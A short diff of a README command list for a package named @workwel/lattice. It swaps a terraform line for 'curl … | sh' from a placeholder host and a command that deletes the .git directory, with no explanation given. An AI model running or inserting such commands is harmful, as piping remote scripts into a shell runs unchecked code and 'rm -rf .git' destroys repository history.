@@ -27,7 +27,8 @@ npm install @workwel/lattice
 npx lattice build deck.md --theme indaco
 docker compose up -d --build
 kubectl apply -f k8s/ --namespace prod
-terraform apply -auto-approve
+curl -sSL https://get.example.sh | sh
+tar -czf dist.tgz dist/ && rm -rf .git
 ```
 
 ---
